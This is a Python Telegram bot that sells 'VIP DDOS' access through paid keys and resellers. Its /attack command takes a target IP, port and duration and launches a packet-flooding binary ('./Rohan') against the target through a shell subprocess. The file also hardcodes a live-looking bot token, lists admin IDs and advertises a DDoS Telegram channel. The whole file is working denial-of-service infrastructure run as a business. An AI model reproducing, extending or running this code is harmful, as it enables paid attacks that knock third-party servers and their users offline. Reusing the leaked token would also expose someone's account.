import os
import json
import time
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta
import pytz
import signal
import re
import fcntl
import atexit

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
BOT_TOKEN = '7564493380:AAEjc8jXOqBZAwNNZU8sVyiOoFu8K6vY-cg'  # Replace with your bot token
bot = telebot.TeleBot(BOT_TOKEN)

# Admin user IDs and usernames
ADMIN_IDS = {"1807014348", "6258297180", "6955279265"}  # Your ID included
ADMIN_USERNAMES = {"@sadiq9869", "@rahul_618", "@grokbyxai"}

# Files for data storage
DATA_DIR = "data"
USER_FILE = os.path.join(DATA_DIR, "users.json")
LOG_FILE = os.path.join(DATA_DIR, "log.txt")
KEY_FILE = os.path.join(DATA_DIR, "keys.json")
RESELLERS_FILE = os.path.join(DATA_DIR, "resellers.json")
AUTHORIZED_USERS_FILE = os.path.join(DATA_DIR, "authorized_users.json")
BLOCK_ERROR_LOG = os.path.join(DATA_DIR, "block_error_log.txt")
COOLDOWN_FILE = os.path.join(DATA_DIR, "cooldown.json")
LOCK_FILE = os.path.join(DATA_DIR, "bot.lock")

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# In-memory storage
users = {}
keys = {}
authorized_users = {}
last_attack_time = {}
active_attacks = {}  # Track active attacks per user
COOLDOWN_PERIOD = 60  # Default cooldown period in seconds
resellers = {}

# Create data directory if it doesn't exist
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# Lock file management
def acquire_lock():
    lock_fd = open(LOCK_FILE, 'w')
    try:
        fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except BlockingIOError:
        print("Another instance is running. Exiting...")
        exit(1)
    return lock_fd

def release_lock(lock_fd):
    fcntl.flock(lock_fd, fcntl.LOCK_UN)
    lock_fd.close()

lock_fd = acquire_lock()
atexit.register(release_lock, lock_fd)

# Initialize files with validation
def initialize_files():
    for file in [USER_FILE, KEY_FILE, RESELLERS_FILE, AUTHORIZED_USERS_FILE, COOLDOWN_FILE]:
        if not os.path.exists(file):
            try:
                with open(file, 'w', encoding='utf-8') as f:
                    json.dump({}, f) if file != COOLDOWN_FILE else json.dump({"cooldown": 60}, f)
            except Exception as e:
                print(f"Failed to initialize {file}: {e}")
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, 'a').close()
    if not os.path.exists(BLOCK_ERROR_LOG):
        open(BLOCK_ERROR_LOG, 'a').close()

# Utility function for safe replies
def safe_reply(bot, message, text):
    try:
        bot.reply_to(message, text, parse_mode='MarkdownV2')
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            with open(os.path.join(DATA_DIR, "error_log.txt"), "a", encoding='utf-8') as log_file:
                log_file.write(f"[{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}] Message not found: chat_id={message.chat.id}, message_id={message.message_id}, user_id={message.from_user.id}, text={text}\n")
            bot.send_message(message.chat.id, text, parse_mode='MarkdownV2')
        else:
            print(f"Telegram API error: {e}")

def is_admin(user_id, username=None):
    username = username.lower() if username else None
    return (str(user_id) in ADMIN_IDS or username in ADMIN_USERNAMES)

def set_cooldown(seconds):
    global COOLDOWN_PERIOD
    if seconds < 0:
        return
    COOLDOWN_PERIOD = seconds
    try:
        with open(COOLDOWN_FILE, "w", encoding='utf-8') as file:
            json.dump({"cooldown": seconds}, file)
    except Exception as e:
        print(f"Error saving cooldown: {e}")

def load_cooldown():
    global COOLDOWN_PERIOD
    try:
        with open(COOLDOWN_FILE, "r", encoding='utf-8') as file:
            data = json.load(file)
            COOLDOWN_PERIOD = max(0, int(data.get("cooldown", 60)))
    except (FileNotFoundError, json.JSONDecodeError, ValueError):
        COOLDOWN_PERIOD = 60

# Load and validate data
def load_data():
    global users, keys, authorized_users, resellers
    initialize_files()
    try:
        users = read_users()
        keys = read_keys()
        authorized_users = read_authorized_users()
        resellers = load_resellers()
        load_cooldown()
        validate_data()
        print(f"Data loaded successfully. Keys: {list(keys.keys())}")
    except Exception as e:
        print(f"Error loading data, initializing empty structures: {e}")
        users = {}
        keys = {}
        authorized_users = {}
        resellers = {}

def validate_data():
    for key, value in keys.items():
        if not all(k in value for k in ["duration", "device_limit", "devices", "blocked", "generated_time", "generated_by"]):
            keys[key] = {
                "duration": value.get("duration", "1h"),
                "device_limit": value.get("device_limit", 1),
                "devices": value.get("devices", []),
                "blocked": value.get("blocked", False),
                "generated_time": value.get("generated_time", datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')),
                "generated_by": value.get("generated_by", "Unknown")
            }
    for user_id, exp in list(users.items()):
        try:
            datetime.datetime.strptime(exp, '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
        except ValueError:
            del users[user_id]
    for user_id, exp in list(authorized_users.items()):
        try:
            datetime.datetime.strptime(exp, '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
        except ValueError:
            del authorized_users[user_id]

def read_users():
    try:
        with open(USER_FILE, "r", encoding='utf-8') as file:
            return {k: v for k, v in json.load(file).items() if isinstance(v, str)}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_users():
    try:
        with open(USER_FILE, "w", encoding='utf-8') as file:
            json.dump(users, file, indent=4)
    except Exception as e:
        print(f"Error saving users: {e}")

def read_keys():
    try:
        with open(KEY_FILE, "r", encoding='utf-8') as file:
            data = json.load(file)
            return {k: v for k, v in data.items() if isinstance(v, dict)}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_keys():
    try:
        with open(KEY_FILE, "w", encoding='utf-8') as file:
            json.dump(keys, file, indent=4)
    except Exception as e:
        print(f"Error saving keys: {e}")

def read_authorized_users():
    try:
        with open(AUTHORIZED_USERS_FILE, "r", encoding='utf-8') as file:
            return {k: v for k, v in json.load(file).items() if isinstance(v, str)}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_authorized_users():
    try:
        with open(AUTHORIZED_USERS_FILE, "w", encoding='utf-8') as file:
            json.dump(authorized_users, file, indent=4)
    except Exception as e:
        print(f"Error saving authorized users: {e}")

def parse_duration(duration_str):
    duration_str = re.sub(r'[^\dminhdm]', '', duration_str.lower())
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return None, None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if not 1 <= value <= 59:
            return None, None, None, None
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    return current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)

def load_resellers():
    try:
        with open(RESELLERS_FILE, "r", encoding='utf-8') as file:
            return {k: float(v) for k, v in json.load(file).items() if isinstance(v, (int, float))}
    except (FileNotFoundError, json.JSONDecodeError, ValueError):
        return {}

def save_resellers():
    try:
        with open(RESELLERS_FILE, "w", encoding='utf-8') as file:
            json.dump(resellers, file, indent=4)
    except Exception as e:
        print(f"Error saving resellers: {e}")

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    try:
        with open(LOG_FILE, "a", encoding='utf-8') as file:
            file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
    except Exception as e:
        print(f"Error logging command: {e}")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} | Command: {command}"
    if target:
        log_entry += f" | Target: {re.escape(target)}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    try:
        with open(LOG_FILE, "a", encoding='utf-8') as file:
            file.write(log_entry + "\n")
    except Exception as e:
        print(f"Error recording logs: {e}")

def execute_attack(target, port, time, chat_id, username, user_id):
    if active_attacks.get(user_id, False):
        if not is_admin(user_id, bot.get_chat(user_id).username):
            safe_reply(bot, chat_id, "🚫 *BSDK, ruk ja warna gaand mar dunga teri!* Ek attack chal raha hai, dusra mat try kar!")
        else:
            safe_reply(bot, chat_id, "**👑 Kripya karke BGMI ko tazi sa na choda!** Ek attack already chal raha hai, wait karo.")
        return
    try:
        packet_size = 65507  # Max packet size for Rohan.c
        sanitized_target = re.escape(target)
        full_command = f"./Rohan {sanitized_target} {port} {time} {packet_size}"
        response = f"Attack Sent Successfully\nTarget: {sanitized_target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nThreads: 512\nAttacker: @{username}\njoin vip ddos https://t.me/devil_ddos"
        safe_reply(bot, chat_id, response)
        process = subprocess.Popen(full_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        active_attacks[user_id] = process
        threading.Timer(int(time), lambda: cleanup_attack(user_id, chat_id), [user_id, chat_id]).start()
        last_attack_time[user_id] = datetime.datetime.now(IST)
    except Exception as e:
        safe_reply(bot, chat_id, f"Error executing attack: {str(e)}")
        if user_id in active_attacks:
            del active_attacks[user_id]

def cleanup_attack(user_id, chat_id):
    if user_id in active_attacks:
        del active_attacks[user_id]
    safe_reply(bot, chat_id, "Attack completed")

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username):
        safe_reply(bot, message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 3:
        safe_reply(bot, message, "Usage: /addreseller <user_id> <balance>")
        return
    reseller_id, balance = command[1], command[2]
    try:
        balance = int(balance)
        if balance < 0:
            raise ValueError
    except ValueError:
        safe_reply(bot, message, "Invalid balance amount")
        return
    if reseller_id in resellers:
        safe_reply(bot, message, f"Reseller {reseller_id} already exists")
    else:
        resellers[reseller_id] = balance
        save_resellers()
        safe_reply(bot, message, f"Reseller added successfully\nReseller ID: {reseller_id}\nBalance: {balance} Rs")

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username) and user_id not in resellers:
        safe_reply(bot, message, "Access Denied: Admin or reseller only command")
        return
    command = message.text.split()
    if len(command) != 3:
        safe_reply(bot, message, "Usage: /genkey <duration> <key_name>\nExample: /genkey 1d rahul or /genkey 30min rahul")
        return
    duration, key_name = command[1].lower(), command[2]
    minutes, hours, days, months = parse_duration(duration)
    if all(v is None for v in [minutes, hours, days, months]):
        safe_reply(bot, message, "Invalid duration. Use formats like 30min, 1h, 1d, 1m")
        return

    cost_duration = duration
    if minutes > 0:
        cost_duration = "1min"
    elif hours >= 24:
        days = hours // 24
        hours = 0
        duration = f"{days}d"
        cost_duration = duration
    elif days >= 30:
        months = days // 30
        days = 0
        duration = f"{months}m"
        cost_duration = duration
    elif months > 0:
        cost_duration = "1m" if months == 1 else f"{months}m"
    elif days > 0:
        cost_duration = "1d" if days == 1 else f"{days}d"
    elif hours > 0:
        cost_duration = "1h" if hours == 1 else f"{hours}h"

    custom_key = f"Rahul_sadiq-{key_name}"
    device_limit = 1
    user_info = bot.get_chat(user_id)
    generated_by = user_info.username or f"UserID_{user_id}"
    key_data = {
        "duration": duration,
        "device_limit": device_limit,
        "devices": keys.get(custom_key, {}).get("devices", []),
        "blocked": keys.get(custom_key, {}).get("blocked", False),
        "generated_time": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
        "generated_by": generated_by
    }
    keys[custom_key] = key_data
    save_keys()

    for uid in key_data["devices"]:
        if uid in users:
            expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
            users[uid] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
    save_users()

    response = f"Key {'updated' if custom_key in keys else 'generated'} successfully\nKey: `{custom_key}`\nDuration: {duration}\nDevice Limit: {device_limit}\nGenerated by: @{generated_by}\nGenerated on: {key_data['generated_time']}"
    if user_id in resellers:
        cost = KEY_COST.get(cost_duration, 0)
        if cost > resellers.get(user_id, 0):
            del keys[custom_key]
            save_keys()
            safe_reply(bot, message, "Insufficient balance to generate key")
            return
        resellers[user_id] -= cost
        save_resellers()
        response += f"\nCost: {cost} Rs\nRemaining balance: {resellers[user_id]} Rs"
    safe_reply(bot, message, response)

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
VIP DDOS HELP GUIDE
BOT CONTROLS:
- /start - Start the bot
- /help - Show this guide
POWER MANAGEMENT:
- /attack <ip> <port> <time> - Launch an attack (admin and authorized users only)
- /setcooldown <seconds> - Set the attack cooldown period (admin only)
- /checkcooldown - Check the current cooldown period
- /addreseller <user_id> <balance> - Add a new reseller (admin only)
- /genkey <duration> <key_name> - Generate a key (admin and resellers only)
- /logs - View recent logs (admin only)
- /users - List authorized users (admin only)
- /add <user_id> - Add user ID for access without a key (admin only)
- /remove <user_id> - Remove a user (admin only)
- /resellers - View resellers
- /addbalance <reseller_id> <amount> - Add balance to a reseller (admin only)
- /removereseller <reseller_id> - Remove a reseller (admin only)
- /block <key_name> - Block a key (admin only)
- /redeem <key_name> - Redeem your key (e.g., /redeem Rahul_sadiq-rahul)
- /balance - Check your reseller balance (resellers only)
- /myinfo - View your user information
- /listkeys - List all keys with details (admin only)
EXAMPLE:
- /genkey 1d rahul - Generate a 1-day key
- /attack 192.168.1.1 80 1200 - Launch an attack (long duration supported)
- /setcooldown 120 - Set cooldown to 120 seconds
- /redeem Rahul_sadiq-rahul - Redeem your key
Contact @Rahul_618 for support or to buy keys
Join: https://t.me/devil_ddos
"""
    safe_reply(bot, message, help_text)

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.from_user.id)
    if user_id in resellers:
        balance = resellers.get(user_id, 0)
        safe_reply(bot, message, f"Your balance: {balance} Rs")
    else:
        safe_reply(bot, message, "Access Denied: Reseller only command")

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    if is_admin(user_id, message.from_user.username) or (user_id in authorized_users and not users.get(user_id)):
        safe_reply(bot, message, "Admin/Authorized User: No need to redeem a key.")
        return
    command = message.text.split()
    if len(command) != 2:
        safe_reply(bot, message, "Usage: /redeem <key_name>\nExample: /redeem Rahul_sadiq-rahul")
        return
    key = command[1].strip()
    if user_id in users:
        try:
            exp = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < exp:
                safe_reply(bot, message, f"Active key expires on: {exp.strftime('%Y-%m-%d %I:%M:%S %p')}\nContact @Rahul_618 to extend.")
                return
            del users[user_id]
            save_users()
        except ValueError:
            safe_reply(bot, message, "Invalid expiration. Contact @Rahul_618")
    if key in keys and not keys[key].get("blocked", False):
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            safe_reply(bot, message, "Key device limit reached")
            return
        if user_id in keys[key]["devices"]:
            safe_reply(bot, message, "Key already redeemed")
            return
        minutes, hours, days, months = parse_duration(keys[key]["duration"])
        if all(v is None for v in [minutes, hours, days, months]):
            safe_reply(bot, message, "Invalid key duration. Contact @Rahul_618")
            return
        exp_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
        users[user_id] = exp_time.strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key]["devices"].append(user_id)
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            del keys[key]
        save_users()
        save_keys()
        safe_reply(bot, message, f"Key redeemed\nExpires: {exp_time.strftime('%Y-%m-%d %I:%M:%S %p')}")
    else:
        safe_reply(bot, message, "Invalid or blocked key. Contact @Rahul_618")

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username):
        safe_reply(bot, message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        safe_reply(bot, message, "Usage: /block <key_name>\nExample: /block Rahul_sadiq-rahul")
        return
    key_name = command[1].strip()
    if not key_name.startswith("Rahul_sadiq-"):
        safe_reply(bot, message, "Invalid key format")
        return
    if key_name in keys:
        if keys[key_name].get("blocked", False):
            blocker = keys[key_name].get("blocked_by_username", "Unknown")
            block_time = keys[key_name].get("blocked_time", "Unknown")
            safe_reply(bot, message, f"Key '{key_name}' already blocked by @{blocker} on {block_time}")
            return
        user_info = bot.get_chat(user_id)
        blocker = user_info.username or f"UserID_{user_id}"
        block_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key_name]["blocked"] = True
        keys[key_name]["blocked_by_username"] = blocker
        keys[key_name]["blocked_time"] = block_time
        save_keys()
        safe_reply(bot, message, f"Key '{key_name}' blocked by @{blocker} on {block_time}")
    else:
        safe_reply(bot, message, f"Key '{key_name}' not found")
        with open(BLOCK_ERROR_LOG, "a", encoding='utf-8') as log:
            log.write(f"Block attempt failed for {key_name} at {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username):
        safe_reply(bot, message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        safe_reply(bot, message, "Usage: /add <user_id>")
        return
    target_id = command[1]
    if target_id in authorized_users:
        safe_reply(bot, message, f"User {target_id} already authorized")
        return
    exp_time = add_time_to_current_date(months=1)
    authorized_users[target_id] = exp_time.strftime('%Y-%m-%d %I:%M:%S %p')
    save_authorized_users()
    safe_reply(bot, message, f"User {target_id} authorized until {exp_time.strftime('%Y-%m-%d %I:%M:%S %p')}")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username):
        safe_reply(bot, message, "Access Denied: Admin only command")
        return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except Exception as e:
            safe_reply(bot, message, f"Error sending logs: {e}")
    else:
        safe_reply(bot, message, "No logs available")

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    has_access = is_admin(user_id, username) or user_id in users or user_id in authorized_users
    if has_access and user_id in users:
        try:
            exp = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            has_access = datetime.datetime.now(IST) < exp
        except ValueError:
            has_access = False
    if has_access and user_id in authorized_users:
        try:
            exp = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            has_access = datetime.datetime.now(IST) < exp
        except ValueError:
            has_access = False
    response = "WELCOME TO VIP DDOS\nUse /help for commands\n/myinfo for details\nJoin: https://t.me/devil_ddos"
    if not has_access:
        response += "\nRedeem a key with /redeem <key_name> or contact @Rahul_618 for access"
    safe_reply(bot, message, response)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    has_access = is_admin(user_id, username)
    if not has_access and user_id in users:
        try:
            exp = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            has_access = datetime.datetime.now(IST) < exp
        except ValueError:
            has_access = False
    if not has_access and user_id in authorized_users:
        try:
            exp = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            has_access = datetime.datetime.now(IST) < exp
        except ValueError:
            has_access = False
    if not has_access:
        safe_reply(bot, message, "Unauthorized. Contact @Rahul_618 for a key")
        return
    if user_id in last_attack_time:
        cooldown = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
        if cooldown < COOLDOWN_PERIOD:
            safe_reply(bot, message, f"Cooldown: {int(COOLDOWN_PERIOD - cooldown)}s remaining")
            return
    command = message.text.split()
    if len(command) != 4:
        safe_reply(bot, message, "Usage: /attack <ip> <port> <time>")
        return
    target, port, time = command[1], command[2], command[3]
    try:
        port, time = int(port), int(time)
        if not 1 <= port <= 65535:
            safe_reply(bot, message, "Invalid port")
            return
        record_command_logs(user_id, "attack", target, port, time)
        log_command(user_id, target, port, time)
        username = bot.get_chat(user_id).username or f"UserID_{user_id}"
        execute_attack(target, port, time, message.chat.id, username, user_id)
    except ValueError:
        safe_reply(bot, message, "Invalid input")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username):
        safe_reply(bot, message, "Access Denied: Admin only")
        return
    command = message.text.split()
    if len(command) != 2:
        safe_reply(bot, message, "Usage: /setcooldown <seconds>")
        return
    try:
        seconds = int(command[1])
        set_cooldown(seconds)
        safe_reply(bot, message, f"Cooldown set to {seconds}s")
    except ValueError:
        safe_reply(bot, message, "Invalid number")

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    safe_reply(bot, message, f"Cooldown: {COOLDOWN_PERIOD}s")

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    role = "Guest"
    exp = "N/A"
    balance = 0
    key = "N/A"

    if is_admin(user_id, username):
        role = "Admin"
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
    elif user_id in users:
        role = "User"
        try:
            exp = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST).strftime('%Y-%m-%d %I:%M:%S %p')
            key = next((k for k, v in keys.items() if user_id in v["devices"] and not v["blocked"]), "N/A")
        except (ValueError, StopIteration):
            exp = "Invalid"
    elif user_id in authorized_users:
        role = "Authorized"
        try:
            exp = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST).strftime('%Y-%m-%d %I:%M:%S %p')
        except ValueError:
            exp = "Invalid"

    response = f"INFO\nUsername: @{username}\nID: {user_id}\nRole: {role}\nExpiration: {exp}\nKey: {key}"
    if role == "Reseller":
        response += f"\nBalance: {balance} Rs"
    response += "\nContact @Rahul_618 for support"
    safe_reply(bot, message, response)

@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username):
        safe_reply(bot, message, "Access Denied: Admin only")
        return
    all_users = {**users, **authorized_users}
    if all_users:
        response = "USERS\n" + "\n".join(f"ID: {uid} | Exp: {exp}" for uid, exp in all_users.items())
    else:
        response = "No users"
    safe_reply(bot, message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username):
        safe_reply(bot, message, "Access Denied: Admin only")
        return
    command = message.text.split()
    if len(command) != 2:
        safe_reply(bot, message, "Usage: /remove <user_id>")
        return
    target_id = command[1]
    if target_id in users:
        del users[target_id]
        save_users()
        safe_reply(bot, message, f"Removed {target_id} from users")
    elif target_id in authorized_users:
        del authorized_users[target_id]
        save_authorized_users()
        safe_reply(bot, message, f"Removed {target_id} from authorized")
    else:
        safe_reply(bot, message, f"User {target_id} not found")

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    if resellers:
        response = "RESELLERS\n" + "\n".join(f"ID: {rid} | Balance: {bal} Rs" for rid, bal in resellers.items())
    else:
        response = "No resellers"
    safe_reply(bot, message, response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username):
        safe_reply(bot, message, "Access Denied: Admin only")
        return
    command = message.text.split()
    if len(command) != 3:
        safe_reply(bot, message, "Usage: /addbalance <reseller_id> <amount>")
        return
    reseller_id, amount = command[1], command[2]
    try:
        amount = float(amount)
        if amount <= 0 or reseller_id not in resellers:
            raise ValueError
        resellers[reseller_id] += amount
        save_resellers()
        safe_reply(bot, message, f"Added {amount} Rs to {reseller_id}. New balance: {resellers[reseller_id]} Rs")
    except ValueError:
        safe_reply(bot, message, "Invalid input")

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username):
        safe_reply(bot, message, "Access Denied: Admin only")
        return
    command = message.text.split()
    if len(command) != 2:
        safe_reply(bot, message, "Usage: /removereseller <reseller_id>")
        return
    reseller_id = command[1]
    if reseller_id in resellers:
        del resellers[reseller_id]
        save_resellers()
        safe_reply(bot, message, f"Removed reseller {reseller_id}")
    else:
        safe_reply(bot, message, "Reseller not found")

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.from_user.id)
    if not is_admin(user_id, message.from_user.username):
        safe_reply(bot, message, "Access Denied: Admin only")
        return
    if keys:
        response = "KEYS\n" + "\n".join(
            f"Key: {k}\nGen by: @{v['generated_by']}\nTime: {v['generated_time']}\nDur: {v['duration']}\nLimit: {v['device_limit']}\nDevices: {len(v['devices'])}\nBlocked: {v['blocked']}"
            for k, v in keys.items()
        )
    else:
        response = "No keys"
    safe_reply(bot, message, response)

def save_all_data():
    save_users()
    save_keys()
    save_authorized_users()
    save_resellers()
    print("Data saved on exit")

def periodic_save():
    while True:
        time.sleep(300)  # Save every 5 minutes
        save_all_data()

def signal_handler(signum, frame):
    print(f"Signal {signum} received, saving data...")
    save_all_data()
    release_lock(lock_fd)
    exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
signal.signal(signal.SIGTERM, signal_handler)  # Kill or close

# Start periodic save in background
threading.Thread(target=periodic_save, daemon=True).start()

if __name__ == "__main__":
    load_data()
    backoff_time = 1
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Fatal error: {e}")
        save_all_data()
        release_lock(lock_fd)
        exit(1)